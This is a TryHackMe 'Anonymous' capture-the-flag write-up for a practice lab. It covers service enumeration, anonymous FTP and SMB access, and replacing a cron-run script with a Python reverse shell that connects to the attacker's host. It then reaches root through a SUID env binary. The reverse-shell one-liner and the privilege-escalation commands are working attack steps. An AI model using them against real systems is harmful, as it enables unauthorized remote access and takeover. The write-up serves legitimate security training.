# TryHackMe-AnonymousCTF-Writeup

Writeup for Anonymous room, ctf avaiable at https://tryhackme.com/room/anonymous (visit try hack me https://tryhackme.com/)

### General info

Some alias:

MACHINE_IP = victim's ip
MY_IP = my ip address on Try Hack Me network

I'm using a kali virtual machine and connecting via openVPN

## First task

Since I'm running nmap (in order to enumerate the machine) as root, the scan would be a syn scan by default: 

`nmap -A $MACHINE_IP`

Just count the open ports.

## Second task/Third task

-A flag being used, the command for the first question also gives the answers for the second and the third ones.

## Fourth task

We can use enum4linux to answer this:

`enum4linux MACHINE_IP`

it gives us the answer

## Fifth task

I decided to try anonymous login on the ftp and smb services to see if I could find interesting files

for smb:

`smbclient //MACHINE_IP/<name of the share from the previous task>`

Just hit enter when it asks for the password.
I was able to download two pictures, and used both exiftool and steghide to retrieve more information.
I also tried stegseek on both images but I was able to retrieve no passphrase so ... nothing with the pics!

for ftp:

`ftp $MACHINE_IP` 

Entered username "anonymous" and no password.

There was one directory called scripts containing some files: clean.sh , removed_files.log, to_do.txt

I used 'get <filename' ftp's command to get them on my machine: 
to_do.txt -> was a note from the admin which states that anonymous login is not secure ... you don't say!
clean.sh -> It's a cleanup scripts that is going to write something in removed_files.log when it's executed
removed_files.log -> contains the log from the previous script.

Monitoring the content of removed_files.log I realized that the script was running about every minute, so I used it to gain a reverse python shell:

>> !#/bin/bash
>> export RHOST="MY_IP";export RPORT=4445;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

(The previous reverse shell was taken from the git project: https://github.com/swisskyrepo/PayloadsAllTheThings)

I uploaded it with ftp overriding the old clean.sh, started a netcat listener (`nc -lvnp 4445`) and waited few seconds.

I receveid a reverse shell which I stabilized by background the process (ctrl + z) and running `stty raw -echo; fg`

I ran `id` and `whoami` to acknowledge I was logged as 'namelessone' in whose home directory I found the file user.txt containing the flag for this task

## Sixth task

As I usually do, the first thing to find privilage escaltion vectors was 
`find / -perm /6000 2>/dev/null`
which reveals you all the files with the SUID set so you can see if there is something unusual. In this case I found the bin "/usr/bin/env" which I searched for on GTFOBins, I found the exploitaion which requires you to change directory in /usr/bin and run
`./env /bin/sh -p`
This gave me a root reverse shell I could use to retrieve the root flag located in /root

